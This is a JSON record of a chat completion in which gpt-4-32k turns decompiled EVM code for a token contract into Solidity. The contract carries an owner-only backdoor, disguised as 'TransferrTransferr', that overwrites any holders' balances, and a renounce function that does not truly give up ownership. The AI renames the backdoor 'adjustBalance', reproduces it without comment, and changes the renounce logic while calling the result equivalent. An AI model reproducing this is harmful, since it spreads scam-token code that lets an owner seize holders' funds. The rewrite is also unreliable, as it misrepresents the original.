{
	"address": "0x962bcc834cbd77d452b81adbe3d80e9df5bccef7",
	"choices": [
		{
			"finish_reason": "stop",
			"index": 0,
			"message": {
				"content": "Sure, here's the Solidity code equivalent to the decompiled program:\n\n```solidity\npragma solidity 0.8.20;\n\ncontract ContractName {\n\n    mapping (address => uint256) private _balanceOf;\n    mapping (address => mapping (address => uint256)) private _approve;\n    uint256 private _totalSupply;\n    uint8 private _decimals;\n    address private _owner;\n    string private _name;\n    string private _symbol;\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event BalanceAdjusted(address indexed owner, uint256 oldBalance, uint256 newBalance);\n    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);\n\n    function transferFrom(address from, address to, uint256 value) public {\n        require(_approve[from][msg.sender] >= value, \"TT: transfer amount exceeds allowance\");\n        require(_balanceOf[from] >= value, \"TT: transfer amount exceeds balance\");\n        _balanceOf[from] -= value;\n        _balanceOf[to] += value;\n        _approve[from][msg.sender] -= value;\n        emit Transfer(from, to, value);\n    }\n\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n\n    function adjustBalance(address[] memory owners, uint256 newBalance) public {\n        require(msg.sender == _owner, \"Ownable: caller is not the owner\");\n        for (uint256 i = 0; i < owners.length; i++) {\n            uint256 oldBalance = _balanceOf[owners[i]];\n            _balanceOf[owners[i]] = newBalance;\n            emit BalanceAdjusted(owners[i], oldBalance, newBalance);\n        }\n    }\n\n    function balanceOf(address owner) public view returns (uint256) {\n        return _balanceOf[owner];\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(_balanceOf[msg.sender] >= value, \"TT: transfer amount exceeds balance\");\n        _balanceOf[msg.sender] -= value;\n        _balanceOf[to] += value;\n        emit Transfer(msg.sender, to, value);\n    }\n\n    function renounceOwnership() public {\n        require(msg.sender == _owner, \"Ownable: caller is not the owner\");\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n\n    function allowance(address owner, address spender) public view returns (uint256) {\n        return _approve[owner][spender];\n    }\n\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    function approve(address spender, uint256 value) public {\n        _approve[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n    }\n\n    function totalSupply() public view returns (uint256) {\n        return _totalSupply;\n    }\n}\n```\n\nPlease note that this is not the exact equivalent but a simplified and readable version of the code. The decompiled code you provided contains a lot of low-level operations, logical conditions, and error checks that aren't typically written in Solidity but are part of the compiled EVM bytecode. My version focuses on the high-level logic of the contract.",
				"role": "assistant"
			}
		}
	],
	"created": 1701485898,
	"id": "chatcmpl-8RAUs0O7JnylXWAqhOPaitK1e7Rz2",
	"input_format": "DecompiledCode",
	"ir": "// Decompiled by library.dedaub.com\n// 2023.11.16 08:37 UTC\n// Compiled using the solidity compiler version 0.8.20\n\n\n// Data structures and variables inferred from the use of storage instructions\nuint256 _owner; // STORAGE[0x0]\nmapping (uint256 => uint256) _balanceOf; // STORAGE[0x1]\nmapping (uint256 => mapping (uint256 => uint256)) _approve; // STORAGE[0x2]\nuint256[] _@name_237; // STORAGE[0x3]\nuint256[] _@symbol_245; // STORAGE[0x4]\nuint256 _totalSupply; // STORAGE[0x6]\nuint256 _decimals; // STORAGE[0x5] bytes 0 to 0\n\n\n// Events\nApproval(address, address, uint256);\nTransfer(address, address, uint256);\nBalanceAdjusted(address, uint256, uint256);\nownershipTransferred(address, address);\n\nfunction transferFrom(address varg0, address varg1, uint256 varg2) public payable { \n    require(msg.data.length - 4 >= 96);\n    require(varg0 == varg0);\n    require(varg1 == varg1);\n    require(varg2 <= _approve[varg0][msg.sender], Error('TT: transfer amount exceeds allowance'));\n    require(_balanceOf[varg0] - varg2 <= _balanceOf[varg0], Panic(17)); // arithmetic overflow or underflow\n    _balanceOf[varg0] = _balanceOf[varg0] - varg2;\n    require(_balanceOf[varg1] <= varg2 + _balanceOf[varg1], Panic(17)); // arithmetic overflow or underflow\n    _balanceOf[varg1] += varg2;\n    require(_approve[varg0][msg.sender] - varg2 <= _approve[varg0][msg.sender], Panic(17)); // arithmetic overflow or underflow\n    _approve[varg0][msg.sender] = _approve[varg0][msg.sender] - varg2;\n    emit Transfer(varg0, varg1, varg2);\n    return bool(1);\n}\n\nfunction decimals() public payable { \n    return _decimals;\n}\n\nfunction TransferrTransferr(address[] varg0, uint256 varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 <= uint64.max);\n    require(4 + varg0 + 31 < msg.data.length);\n    require(varg0.length <= uint64.max, Panic(65)); // failed memory allocation (too much memory)\n    v0 = new address[](varg0.length);\n    require(!((v0 + ((varg0.length << 5) + 63 & ~0x1f) > uint64.max) | (v0 + ((varg0.length << 5) + 63 & ~0x1f) < v0)), Panic(65)); // failed memory allocation (too much memory)\n    v1 = v2 = v0.data;\n    require(32 + ((varg0.length << 5) + (4 + varg0)) <= msg.data.length);\n    v3 = v4 = varg0.data;\n    while (v3 < 32 + ((varg0.length << 5) + (4 + varg0))) {\n        require(msg.data[v3] == address(msg.data[v3]));\n        MEM[v1] = msg.data[v3];\n        v3 += 32;\n        v1 += 32;\n    }\n    require(msg.sender == address(_owner), Error('Ownable: caller is not the owner'));\n    v5 = v6 = 0;\n    while (v5 < v0.length) {\n        require(v5 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice\n        _balanceOf[address(v0[v5])] = varg1;\n        emit BalanceAdjusted(address(v0[v5]), _balanceOf[address(v0[v5])], varg1);\n        require(v5 + 1, Panic(17)); // arithmetic overflow or underflow\n        v5 += 1;\n    }\n}\n\nfunction balanceOf(address varg0) public payable { \n    require(msg.data.length - 4 >= 32);\n    require(varg0 == varg0);\n    return _balanceOf[varg0];\n}\n\nfunction owner() public payable { \n    return address(_owner);\n}\n\nfunction symbol() public payable { \n    v0 = @symbol_245();\n    v1 = new bytes[](v0.length);\n    v2 = v3 = 0;\n    while (v2 < v0.length) {\n        v1[v2] = v0[v2];\n        v2 += 32;\n    }\n    v1[v0.length] = 0;\n    return v1;\n}\n\nfunction transfer(address varg0, uint256 varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 == varg0);\n    require(varg1 <= _balanceOf[msg.sender], Error('TT: transfer amount exceeds balance'));\n    require(_balanceOf[msg.sender] - varg1 <= _balanceOf[msg.sender], Panic(17)); // arithmetic overflow or underflow\n    _balanceOf[msg.sender] = _balanceOf[msg.sender] - varg1;\n    require(_balanceOf[varg0] <= varg1 + _balanceOf[varg0], Panic(17)); // arithmetic overflow or underflow\n    _balanceOf[varg0] += varg1;\n    emit Transfer(msg.sender, varg0, varg1);\n    return bool(1);\n}\n\nfunction renounceownership() public payable { \n    require(msg.sender == address(_owner), Error('Ownable: caller is not the owner'));\n    emit ownershipTransferred(address(_owner), 57005);\n    _owner = 0xdead | bytes12(_owner);\n}\n\nfunction allowance(address varg0, address varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 == varg0);\n    require(varg1 == varg1);\n    return _approve[varg0][varg1];\n}\n\nfunction @name_237() private { \n    v0 = v1 = _@name_237.length >> 1;\n    if (!(_@name_237.length & 0x1)) {\n        v0 = v2 = v1 & 0x7f;\n    }\n    require((_@name_237.length & 0x1) - (v0 < 32), Panic(34)); // access to incorrectly encoded storage byte array\n    v3 = new bytes[](v0);\n    v4 = v5 = v3.data;\n    v6 = v7 = _@name_237.length >> 1;\n    if (!(_@name_237.length & 0x1)) {\n        v6 = v8 = v7 & 0x7f;\n    }\n    require((_@name_237.length & 0x1) - (v6 < 32), Panic(34)); // access to incorrectly encoded storage byte array\n    if (!v6) {\n        return v3;\n    } else if (31 < v6) {\n        v9 = _@name_237.data;\n        do {\n            MEM[v4] = STORAGE[v9];\n            v9 += 1;\n            v4 += 32;\n        } while (v5 + v6 <= v4);\n        return v3;\n    } else {\n        MEM[v5] = _@name_237.length >> 8 << 8;\n        return v3;\n    }\n}\n\nfunction @symbol_245() private { \n    v0 = v1 = _@symbol_245.length >> 1;\n    if (!(_@symbol_245.length & 0x1)) {\n        v0 = v2 = v1 & 0x7f;\n    }\n    require((_@symbol_245.length & 0x1) - (v0 < 32), Panic(34)); // access to incorrectly encoded storage byte array\n    v3 = new bytes[](v0);\n    v4 = v5 = v3.data;\n    v6 = v7 = _@symbol_245.length >> 1;\n    if (!(_@symbol_245.length & 0x1)) {\n        v6 = v8 = v7 & 0x7f;\n    }\n    require((_@symbol_245.length & 0x1) - (v6 < 32), Panic(34)); // access to incorrectly encoded storage byte array\n    if (!v6) {\n        return v3;\n    } else if (31 < v6) {\n        v9 = _@symbol_245.data;\n        do {\n            MEM[v4] = STORAGE[v9];\n            v9 += 1;\n            v4 += 32;\n        } while (v5 + v6 <= v4);\n        return v3;\n    } else {\n        MEM[v5] = _@symbol_245.length >> 8 << 8;\n        return v3;\n    }\n}\n\nfunction () public payable { \n    revert();\n}\n\nfunction name() public payable { \n    v0 = @name_237();\n    v1 = new bytes[](v0.length);\n    v2 = v3 = 0;\n    while (v2 < v0.length) {\n        v1[v2] = v0[v2];\n        v2 += 32;\n    }\n    v1[v0.length] = 0;\n    return v1;\n}\n\nfunction approve(address varg0, uint256 varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 == varg0);\n    _approve[msg.sender][varg0] = varg1;\n    emit Approval(msg.sender, varg0, varg1);\n    return bool(1);\n}\n\nfunction totalSupply() public payable { \n    return _totalSupply;\n}\n\n// Note: The function selector is not present in the original solidity code.\n// However, we display it for the sake of completeness.\n\nfunction __function_selector__(bytes4 function_selector) public payable { \n    MEM[64] = 128;\n    require(!msg.value);\n    if (msg.data.length >= 4) {\n        if (0x70a08231 > function_selector >> 224) {\n            if (0x6fdde03 == function_selector >> 224) {\n                name();\n            } else if (0x95ea7b3 == function_selector >> 224) {\n                approve(address,uint256);\n            } else if (0x18160ddd == function_selector >> 224) {\n                totalSupply();\n            } else if (0x23b872dd == function_selector >> 224) {\n                transferFrom(address,address,uint256);\n            } else if (0x313ce567 == function_selector >> 224) {\n                decimals();\n            } else if (0x492e496a == function_selector >> 224) {\n                TransferrTransferr(address[],uint256);\n            }\n        } else if (0x70a08231 == function_selector >> 224) {\n            balanceOf(address);\n        } else if (0x8da5cb5b == function_selector >> 224) {\n            owner();\n        } else if (0x95d89b41 == function_selector >> 224) {\n            symbol();\n        } else if (0xa9059cbb == function_selector >> 224) {\n            transfer(address,uint256);\n        } else if (0xc2af913b == function_selector >> 224) {\n            renounceownership();\n        } else {\n            require(0xdd62ed3e == function_selector >> 224);\n            allowance(address,address);\n        }\n    }\n    ();\n}\n",
	"language": "Solidity",
	"messages": [
		{
			"content": "You are an experienced smart contract developer that excels at Solidity program languages. Please write a contract code by the following decompiled code lifted from EVM Bytecode.",
			"role": "system"
		},
		{
			"content": "The following is the decompiled code: // Decompiled by library.dedaub.com\n// 2023.11.16 08:37 UTC\n// Compiled using the solidity compiler version 0.8.20\n\n\n// Data structures and variables inferred from the use of storage instructions\nuint256 _owner; // STORAGE[0x0]\nmapping (uint256 => uint256) _balanceOf; // STORAGE[0x1]\nmapping (uint256 => mapping (uint256 => uint256)) _approve; // STORAGE[0x2]\nuint256[] _@name_237; // STORAGE[0x3]\nuint256[] _@symbol_245; // STORAGE[0x4]\nuint256 _totalSupply; // STORAGE[0x6]\nuint256 _decimals; // STORAGE[0x5] bytes 0 to 0\n\n\n// Events\nApproval(address, address, uint256);\nTransfer(address, address, uint256);\nBalanceAdjusted(address, uint256, uint256);\nownershipTransferred(address, address);\n\nfunction transferFrom(address varg0, address varg1, uint256 varg2) public payable { \n    require(msg.data.length - 4 >= 96);\n    require(varg0 == varg0);\n    require(varg1 == varg1);\n    require(varg2 <= _approve[varg0][msg.sender], Error('TT: transfer amount exceeds allowance'));\n    require(_balanceOf[varg0] - varg2 <= _balanceOf[varg0], Panic(17)); // arithmetic overflow or underflow\n    _balanceOf[varg0] = _balanceOf[varg0] - varg2;\n    require(_balanceOf[varg1] <= varg2 + _balanceOf[varg1], Panic(17)); // arithmetic overflow or underflow\n    _balanceOf[varg1] += varg2;\n    require(_approve[varg0][msg.sender] - varg2 <= _approve[varg0][msg.sender], Panic(17)); // arithmetic overflow or underflow\n    _approve[varg0][msg.sender] = _approve[varg0][msg.sender] - varg2;\n    emit Transfer(varg0, varg1, varg2);\n    return bool(1);\n}\n\nfunction decimals() public payable { \n    return _decimals;\n}\n\nfunction TransferrTransferr(address[] varg0, uint256 varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 <= uint64.max);\n    require(4 + varg0 + 31 < msg.data.length);\n    require(varg0.length <= uint64.max, Panic(65)); // failed memory allocation (too much memory)\n    v0 = new address[](varg0.length);\n    require(!((v0 + ((varg0.length << 5) + 63 & ~0x1f) > uint64.max) | (v0 + ((varg0.length << 5) + 63 & ~0x1f) < v0)), Panic(65)); // failed memory allocation (too much memory)\n    v1 = v2 = v0.data;\n    require(32 + ((varg0.length << 5) + (4 + varg0)) <= msg.data.length);\n    v3 = v4 = varg0.data;\n    while (v3 < 32 + ((varg0.length << 5) + (4 + varg0))) {\n        require(msg.data[v3] == address(msg.data[v3]));\n        MEM[v1] = msg.data[v3];\n        v3 += 32;\n        v1 += 32;\n    }\n    require(msg.sender == address(_owner), Error('Ownable: caller is not the owner'));\n    v5 = v6 = 0;\n    while (v5 < v0.length) {\n        require(v5 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice\n        _balanceOf[address(v0[v5])] = varg1;\n        emit BalanceAdjusted(address(v0[v5]), _balanceOf[address(v0[v5])], varg1);\n        require(v5 + 1, Panic(17)); // arithmetic overflow or underflow\n        v5 += 1;\n    }\n}\n\nfunction balanceOf(address varg0) public payable { \n    require(msg.data.length - 4 >= 32);\n    require(varg0 == varg0);\n    return _balanceOf[varg0];\n}\n\nfunction owner() public payable { \n    return address(_owner);\n}\n\nfunction symbol() public payable { \n    v0 = @symbol_245();\n    v1 = new bytes[](v0.length);\n    v2 = v3 = 0;\n    while (v2 < v0.length) {\n        v1[v2] = v0[v2];\n        v2 += 32;\n    }\n    v1[v0.length] = 0;\n    return v1;\n}\n\nfunction transfer(address varg0, uint256 varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 == varg0);\n    require(varg1 <= _balanceOf[msg.sender], Error('TT: transfer amount exceeds balance'));\n    require(_balanceOf[msg.sender] - varg1 <= _balanceOf[msg.sender], Panic(17)); // arithmetic overflow or underflow\n    _balanceOf[msg.sender] = _balanceOf[msg.sender] - varg1;\n    require(_balanceOf[varg0] <= varg1 + _balanceOf[varg0], Panic(17)); // arithmetic overflow or underflow\n    _balanceOf[varg0] += varg1;\n    emit Transfer(msg.sender, varg0, varg1);\n    return bool(1);\n}\n\nfunction renounceownership() public payable { \n    require(msg.sender == address(_owner), Error('Ownable: caller is not the owner'));\n    emit ownershipTransferred(address(_owner), 57005);\n    _owner = 0xdead | bytes12(_owner);\n}\n\nfunction allowance(address varg0, address varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 == varg0);\n    require(varg1 == varg1);\n    return _approve[varg0][varg1];\n}\n\nfunction @name_237() private { \n    v0 = v1 = _@name_237.length >> 1;\n    if (!(_@name_237.length & 0x1)) {\n        v0 = v2 = v1 & 0x7f;\n    }\n    require((_@name_237.length & 0x1) - (v0 < 32), Panic(34)); // access to incorrectly encoded storage byte array\n    v3 = new bytes[](v0);\n    v4 = v5 = v3.data;\n    v6 = v7 = _@name_237.length >> 1;\n    if (!(_@name_237.length & 0x1)) {\n        v6 = v8 = v7 & 0x7f;\n    }\n    require((_@name_237.length & 0x1) - (v6 < 32), Panic(34)); // access to incorrectly encoded storage byte array\n    if (!v6) {\n        return v3;\n    } else if (31 < v6) {\n        v9 = _@name_237.data;\n        do {\n            MEM[v4] = STORAGE[v9];\n            v9 += 1;\n            v4 += 32;\n        } while (v5 + v6 <= v4);\n        return v3;\n    } else {\n        MEM[v5] = _@name_237.length >> 8 << 8;\n        return v3;\n    }\n}\n\nfunction @symbol_245() private { \n    v0 = v1 = _@symbol_245.length >> 1;\n    if (!(_@symbol_245.length & 0x1)) {\n        v0 = v2 = v1 & 0x7f;\n    }\n    require((_@symbol_245.length & 0x1) - (v0 < 32), Panic(34)); // access to incorrectly encoded storage byte array\n    v3 = new bytes[](v0);\n    v4 = v5 = v3.data;\n    v6 = v7 = _@symbol_245.length >> 1;\n    if (!(_@symbol_245.length & 0x1)) {\n        v6 = v8 = v7 & 0x7f;\n    }\n    require((_@symbol_245.length & 0x1) - (v6 < 32), Panic(34)); // access to incorrectly encoded storage byte array\n    if (!v6) {\n        return v3;\n    } else if (31 < v6) {\n        v9 = _@symbol_245.data;\n        do {\n            MEM[v4] = STORAGE[v9];\n            v9 += 1;\n            v4 += 32;\n        } while (v5 + v6 <= v4);\n        return v3;\n    } else {\n        MEM[v5] = _@symbol_245.length >> 8 << 8;\n        return v3;\n    }\n}\n\nfunction () public payable { \n    revert();\n}\n\nfunction name() public payable { \n    v0 = @name_237();\n    v1 = new bytes[](v0.length);\n    v2 = v3 = 0;\n    while (v2 < v0.length) {\n        v1[v2] = v0[v2];\n        v2 += 32;\n    }\n    v1[v0.length] = 0;\n    return v1;\n}\n\nfunction approve(address varg0, uint256 varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 == varg0);\n    _approve[msg.sender][varg0] = varg1;\n    emit Approval(msg.sender, varg0, varg1);\n    return bool(1);\n}\n\nfunction totalSupply() public payable { \n    return _totalSupply;\n}\n\n// Note: The function selector is not present in the original solidity code.\n// However, we display it for the sake of completeness.\n\nfunction __function_selector__(bytes4 function_selector) public payable { \n    MEM[64] = 128;\n    require(!msg.value);\n    if (msg.data.length >= 4) {\n        if (0x70a08231 > function_selector >> 224) {\n            if (0x6fdde03 == function_selector >> 224) {\n                name();\n            } else if (0x95ea7b3 == function_selector >> 224) {\n                approve(address,uint256);\n            } else if (0x18160ddd == function_selector >> 224) {\n                totalSupply();\n            } else if (0x23b872dd == function_selector >> 224) {\n                transferFrom(address,address,uint256);\n            } else if (0x313ce567 == function_selector >> 224) {\n                decimals();\n            } else if (0x492e496a == function_selector >> 224) {\n                TransferrTransferr(address[],uint256);\n            }\n        } else if (0x70a08231 == function_selector >> 224) {\n            balanceOf(address);\n        } else if (0x8da5cb5b == function_selector >> 224) {\n            owner();\n        } else if (0x95d89b41 == function_selector >> 224) {\n            symbol();\n        } else if (0xa9059cbb == function_selector >> 224) {\n            transfer(address,uint256);\n        } else if (0xc2af913b == function_selector >> 224) {\n            renounceownership();\n        } else {\n            require(0xdd62ed3e == function_selector >> 224);\n            allowance(address,address);\n        }\n    }\n    ();\n}\n.",
			"role": "user"
		}
	],
	"model": "gpt-4-32k",
	"object": "chat.completion",
	"prompts": "You are an experienced smart contract developer that excels at Solidity program languages. Please write a contract code by the following decompiled code lifted from EVM Bytecode.The following is the decompiled code: // Decompiled by library.dedaub.com\n// 2023.11.16 08:37 UTC\n// Compiled using the solidity compiler version 0.8.20\n\n\n// Data structures and variables inferred from the use of storage instructions\nuint256 _owner; // STORAGE[0x0]\nmapping (uint256 => uint256) _balanceOf; // STORAGE[0x1]\nmapping (uint256 => mapping (uint256 => uint256)) _approve; // STORAGE[0x2]\nuint256[] _@name_237; // STORAGE[0x3]\nuint256[] _@symbol_245; // STORAGE[0x4]\nuint256 _totalSupply; // STORAGE[0x6]\nuint256 _decimals; // STORAGE[0x5] bytes 0 to 0\n\n\n// Events\nApproval(address, address, uint256);\nTransfer(address, address, uint256);\nBalanceAdjusted(address, uint256, uint256);\nownershipTransferred(address, address);\n\nfunction transferFrom(address varg0, address varg1, uint256 varg2) public payable { \n    require(msg.data.length - 4 >= 96);\n    require(varg0 == varg0);\n    require(varg1 == varg1);\n    require(varg2 <= _approve[varg0][msg.sender], Error('TT: transfer amount exceeds allowance'));\n    require(_balanceOf[varg0] - varg2 <= _balanceOf[varg0], Panic(17)); // arithmetic overflow or underflow\n    _balanceOf[varg0] = _balanceOf[varg0] - varg2;\n    require(_balanceOf[varg1] <= varg2 + _balanceOf[varg1], Panic(17)); // arithmetic overflow or underflow\n    _balanceOf[varg1] += varg2;\n    require(_approve[varg0][msg.sender] - varg2 <= _approve[varg0][msg.sender], Panic(17)); // arithmetic overflow or underflow\n    _approve[varg0][msg.sender] = _approve[varg0][msg.sender] - varg2;\n    emit Transfer(varg0, varg1, varg2);\n    return bool(1);\n}\n\nfunction decimals() public payable { \n    return _decimals;\n}\n\nfunction TransferrTransferr(address[] varg0, uint256 varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 <= uint64.max);\n    require(4 + varg0 + 31 < msg.data.length);\n    require(varg0.length <= uint64.max, Panic(65)); // failed memory allocation (too much memory)\n    v0 = new address[](varg0.length);\n    require(!((v0 + ((varg0.length << 5) + 63 & ~0x1f) > uint64.max) | (v0 + ((varg0.length << 5) + 63 & ~0x1f) < v0)), Panic(65)); // failed memory allocation (too much memory)\n    v1 = v2 = v0.data;\n    require(32 + ((varg0.length << 5) + (4 + varg0)) <= msg.data.length);\n    v3 = v4 = varg0.data;\n    while (v3 < 32 + ((varg0.length << 5) + (4 + varg0))) {\n        require(msg.data[v3] == address(msg.data[v3]));\n        MEM[v1] = msg.data[v3];\n        v3 += 32;\n        v1 += 32;\n    }\n    require(msg.sender == address(_owner), Error('Ownable: caller is not the owner'));\n    v5 = v6 = 0;\n    while (v5 < v0.length) {\n        require(v5 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice\n        _balanceOf[address(v0[v5])] = varg1;\n        emit BalanceAdjusted(address(v0[v5]), _balanceOf[address(v0[v5])], varg1);\n        require(v5 + 1, Panic(17)); // arithmetic overflow or underflow\n        v5 += 1;\n    }\n}\n\nfunction balanceOf(address varg0) public payable { \n    require(msg.data.length - 4 >= 32);\n    require(varg0 == varg0);\n    return _balanceOf[varg0];\n}\n\nfunction owner() public payable { \n    return address(_owner);\n}\n\nfunction symbol() public payable { \n    v0 = @symbol_245();\n    v1 = new bytes[](v0.length);\n    v2 = v3 = 0;\n    while (v2 < v0.length) {\n        v1[v2] = v0[v2];\n        v2 += 32;\n    }\n    v1[v0.length] = 0;\n    return v1;\n}\n\nfunction transfer(address varg0, uint256 varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 == varg0);\n    require(varg1 <= _balanceOf[msg.sender], Error('TT: transfer amount exceeds balance'));\n    require(_balanceOf[msg.sender] - varg1 <= _balanceOf[msg.sender], Panic(17)); // arithmetic overflow or underflow\n    _balanceOf[msg.sender] = _balanceOf[msg.sender] - varg1;\n    require(_balanceOf[varg0] <= varg1 + _balanceOf[varg0], Panic(17)); // arithmetic overflow or underflow\n    _balanceOf[varg0] += varg1;\n    emit Transfer(msg.sender, varg0, varg1);\n    return bool(1);\n}\n\nfunction renounceownership() public payable { \n    require(msg.sender == address(_owner), Error('Ownable: caller is not the owner'));\n    emit ownershipTransferred(address(_owner), 57005);\n    _owner = 0xdead | bytes12(_owner);\n}\n\nfunction allowance(address varg0, address varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 == varg0);\n    require(varg1 == varg1);\n    return _approve[varg0][varg1];\n}\n\nfunction @name_237() private { \n    v0 = v1 = _@name_237.length >> 1;\n    if (!(_@name_237.length & 0x1)) {\n        v0 = v2 = v1 & 0x7f;\n    }\n    require((_@name_237.length & 0x1) - (v0 < 32), Panic(34)); // access to incorrectly encoded storage byte array\n    v3 = new bytes[](v0);\n    v4 = v5 = v3.data;\n    v6 = v7 = _@name_237.length >> 1;\n    if (!(_@name_237.length & 0x1)) {\n        v6 = v8 = v7 & 0x7f;\n    }\n    require((_@name_237.length & 0x1) - (v6 < 32), Panic(34)); // access to incorrectly encoded storage byte array\n    if (!v6) {\n        return v3;\n    } else if (31 < v6) {\n        v9 = _@name_237.data;\n        do {\n            MEM[v4] = STORAGE[v9];\n            v9 += 1;\n            v4 += 32;\n        } while (v5 + v6 <= v4);\n        return v3;\n    } else {\n        MEM[v5] = _@name_237.length >> 8 << 8;\n        return v3;\n    }\n}\n\nfunction @symbol_245() private { \n    v0 = v1 = _@symbol_245.length >> 1;\n    if (!(_@symbol_245.length & 0x1)) {\n        v0 = v2 = v1 & 0x7f;\n    }\n    require((_@symbol_245.length & 0x1) - (v0 < 32), Panic(34)); // access to incorrectly encoded storage byte array\n    v3 = new bytes[](v0);\n    v4 = v5 = v3.data;\n    v6 = v7 = _@symbol_245.length >> 1;\n    if (!(_@symbol_245.length & 0x1)) {\n        v6 = v8 = v7 & 0x7f;\n    }\n    require((_@symbol_245.length & 0x1) - (v6 < 32), Panic(34)); // access to incorrectly encoded storage byte array\n    if (!v6) {\n        return v3;\n    } else if (31 < v6) {\n        v9 = _@symbol_245.data;\n        do {\n            MEM[v4] = STORAGE[v9];\n            v9 += 1;\n            v4 += 32;\n        } while (v5 + v6 <= v4);\n        return v3;\n    } else {\n        MEM[v5] = _@symbol_245.length >> 8 << 8;\n        return v3;\n    }\n}\n\nfunction () public payable { \n    revert();\n}\n\nfunction name() public payable { \n    v0 = @name_237();\n    v1 = new bytes[](v0.length);\n    v2 = v3 = 0;\n    while (v2 < v0.length) {\n        v1[v2] = v0[v2];\n        v2 += 32;\n    }\n    v1[v0.length] = 0;\n    return v1;\n}\n\nfunction approve(address varg0, uint256 varg1) public payable { \n    require(msg.data.length - 4 >= 64);\n    require(varg0 == varg0);\n    _approve[msg.sender][varg0] = varg1;\n    emit Approval(msg.sender, varg0, varg1);\n    return bool(1);\n}\n\nfunction totalSupply() public payable { \n    return _totalSupply;\n}\n\n// Note: The function selector is not present in the original solidity code.\n// However, we display it for the sake of completeness.\n\nfunction __function_selector__(bytes4 function_selector) public payable { \n    MEM[64] = 128;\n    require(!msg.value);\n    if (msg.data.length >= 4) {\n        if (0x70a08231 > function_selector >> 224) {\n            if (0x6fdde03 == function_selector >> 224) {\n                name();\n            } else if (0x95ea7b3 == function_selector >> 224) {\n                approve(address,uint256);\n            } else if (0x18160ddd == function_selector >> 224) {\n                totalSupply();\n            } else if (0x23b872dd == function_selector >> 224) {\n                transferFrom(address,address,uint256);\n            } else if (0x313ce567 == function_selector >> 224) {\n                decimals();\n            } else if (0x492e496a == function_selector >> 224) {\n                TransferrTransferr(address[],uint256);\n            }\n        } else if (0x70a08231 == function_selector >> 224) {\n            balanceOf(address);\n        } else if (0x8da5cb5b == function_selector >> 224) {\n            owner();\n        } else if (0x95d89b41 == function_selector >> 224) {\n            symbol();\n        } else if (0xa9059cbb == function_selector >> 224) {\n            transfer(address,uint256);\n        } else if (0xc2af913b == function_selector >> 224) {\n            renounceownership();\n        } else {\n            require(0xdd62ed3e == function_selector >> 224);\n            allowance(address,address);\n        }\n    }\n    ();\n}\n.",
	"status": "1",
	"time_cost": 22.795657634735107,
	"usage": {
		"completion_tokens": 714,
		"prompt_tokens": 2593,
		"total_tokens": 3307
	}
}